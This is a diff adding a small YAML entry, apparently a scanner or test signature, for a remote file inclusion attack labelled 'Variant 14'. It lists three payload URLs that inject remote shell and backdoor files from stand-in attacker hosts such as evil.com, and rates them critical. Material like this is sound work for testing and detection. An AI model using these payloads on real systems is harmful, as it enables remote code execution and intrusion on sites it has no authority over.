@@ -1,0 +1,7 @@
+name: Remote File Inclusion (RFI) Variant 14
+payloads:
+- http://evil.com/shell.txt
+- https://attacker.com/malicious.php
+- http://example.com/?page=http://evil.com/backdoor.txt
+severity: critical
+type: rfi
